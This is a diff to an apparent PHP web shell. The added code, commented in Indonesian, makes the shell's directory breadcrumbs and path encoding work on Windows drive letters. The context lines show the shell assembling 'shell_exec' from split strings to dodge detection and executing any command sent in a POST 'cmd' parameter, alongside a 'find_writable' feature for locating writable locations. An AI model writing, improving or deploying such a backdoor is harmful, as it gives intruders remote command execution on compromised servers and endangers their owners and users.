@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 
 
 $s_e = 'sh'.'ell'.'_ex'.'ec';
@@ -124,7 +124,13 @@ if (isset($_POST['find_writable'])) {
 $out = "";
 if (isset($_POST['cmd'])) { $out = $s_e($_POST['cmd'] . " 2>&1"); }
 
-function ep($p) { return str_replace('%2F', '/', rawurlencode($p)); }
+function ep($p) {
+    // Encode path tapi jaga agar ':' pada drive letter Windows (misal C:) tidak ter-encode
+    $encoded = str_replace('%2F', '/', rawurlencode($p));
+    // Kembalikan '%3A' menjadi ':' hanya untuk drive letter di awal (misal C%3A -> C:)
+    $encoded = preg_replace('/^([A-Za-z])%3A/', '$1:', $encoded);
+    return $encoded;
+}
 
 function get_perms($f) { return substr(sprintf('%o', fileperms($f)), -4); }
 
@@ -146,6 +152,13 @@ function formatSize($bytes) {
 }
 
 $parts = explode('/', $dir);
+// Untuk Windows: gabungkan drive letter (misal ['C:', 'xampp']) agar breadcrumb benar
+// Deteksi jika segmen pertama adalah drive letter Windows (misal 'C:')
+if (!empty($parts[0]) && preg_match('/^[A-Za-z]:$/', $parts[0])) {
+    $is_windows_path = true;
+} else {
+    $is_windows_path = false;
+}
 ?>
 <!DOCTYPE html>
 <html style="background:#111;color:#ccc;font-family:monospace;">
@@ -173,8 +186,21 @@ $parts = explode('/', $dir);
         📍 <?php 
         $path_build = "";
         foreach($parts as $p) {
-            if($p==="") { echo "<a href='?d=/'>/</a>"; $path_build="/"; continue; }
-            $path_build .= ($path_build=="/" ? "" : "/") . $p;
+            if($p==="") {
+                // Segmen kosong = root Unix (/)
+                if ($path_build === "") { echo "<a href='?d=/'>/</a>"; $path_build="/"; }
+                continue;
+            }
+            if ($path_build === "") {
+                if ($is_windows_path) {
+                    // Drive letter Windows (misal 'C:') sebagai root
+                    $path_build = $p;
+                } else {
+                    $path_build = "/" . $p;
+                }
+            } else {
+                $path_build .= "/" . $p;
+            }
             echo "<a href='?d=".ep($path_build)."'>$p</a>/";
         }
         ?>
